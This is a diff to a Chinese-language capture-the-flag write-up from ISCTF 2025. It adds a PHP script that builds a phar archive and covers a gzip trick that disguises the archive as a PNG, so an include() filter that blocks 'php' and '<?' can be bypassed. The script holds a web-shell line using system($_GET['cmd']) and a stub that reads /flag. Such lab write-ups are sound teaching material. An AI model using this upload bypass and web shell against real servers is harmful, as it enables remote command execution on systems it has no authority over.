@@ -70,6 +70,33 @@ if(isset($file) && strtolower(substr($file, -4)) == ".png"){
 对文件内容过滤了`php`,`<?`,总之换标签是行不通了。这里就卡住了，学了什么的小技巧才知道，对于`include()`函数只要文件名中包含了`.phar`就会当作是在include一个phar文件。并且如果文件内容经过压缩的话还能自动解压，这样phar中的可见php代码也没有了。完美绕过。
 
 实践：
-首先通过脚本生成一个phar文件，并且通过
+首先通过脚本生成一个phar文件，
+```php
+<?php
+class TestObject {
+    public $a="<?php echo '触发matedata中的php代码'; ?>";
+}
+@unlink("phar.phar");                  // 删除旧的 phar 文件（如果存在）
+
+$phar = new Phar("phar.phar");         // 创建一个新的 phar 对象，文件名必须以 .phar 结尾
+$phar->startBuffering();               // 开始缓冲（准备写入 phar 内容）
+
+$data = '<?php system($_GET["cmd"]);?>';
+
+$phar->setStub('<?php system("cat /flag") ;  __HALT_COMPILER(); ?>');  // 设置 stub（文件头部的启动代码）
+
+$o = new TestObject();
+// 实例化一个对象
+$phar->setMetadata($o);                // 把对象放到 phar 的 metadata 区域（存入 manifest）
+
+$phar->addFromString("test.txt", "<?php echo '触发phar中test.txt中的php代码'; ?>"); // 向 phar 添加一个文件 test.txt，内容为 "test"
+
+// phar 内部会自动计算签名（默认是 SHA1）
+$phar->stopBuffering();                // 停止缓冲并写入文件
+
+?>
+```
+并且通过
 `gzip -c phar.phar >1.phar.png`命令把压缩后的phar文件直接写入一个png文件，然后上传就好了![](assets/ISCTF%202025/file-20251209023903748.png)
-已经成功绕过
+已经成功绕过，得到flag（后面不是同一个所以文件名有差异）
+![](assets/ISCTF%202025/file-20251209025753308.png)
